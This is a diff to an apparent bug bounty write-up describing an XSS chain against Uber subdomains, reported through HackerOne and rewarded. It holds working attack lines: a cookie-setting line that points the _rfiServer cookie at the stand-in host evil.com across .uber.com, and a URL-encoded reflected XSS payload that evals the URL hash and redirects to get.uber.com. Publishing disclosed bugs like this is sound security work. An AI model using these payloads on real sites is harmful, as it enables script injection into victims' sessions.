@@ -3,7 +3,7 @@ date: 2017-08-30 19:36:20
 tags: ["安全", "XSS", "BBP"]
 ---
 
-This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
+This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
 
 ## JSONP Request
 
@@ -45,12 +45,12 @@ What? We need to find a bug to trigger another bug. And why any subdomain of ube
 Any subdomain of uber.com can set cookie with domain `.uber.com` to be used across subdomains. For instance, we can set cookie in `xxx.uber.com` using following code, then `get.uber.com` will use the cookie value.
 
 ```
-document.cookie = '_rfiServer=eviljs.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
+document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
 ```
 
 ![](https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg)
 
-## XSS of uber.com but Out of Scope
+## XSS of <redacted>.uber.com which is Out of Scope
 
 I did really find out one reflected XSS in one of Uber's subdomain using search engine. Let's call the domain `<redacted>.uber.com` for demo.
 
@@ -71,3 +71,5 @@ I did really find out one reflected XSS in one of Uber's subdomain using search 
   email=aaa"%20type%3d"image"%20src%3d1%20o>nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))
   #document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";
   ```
+
+4. Thanks for Uber. Reward: 5k
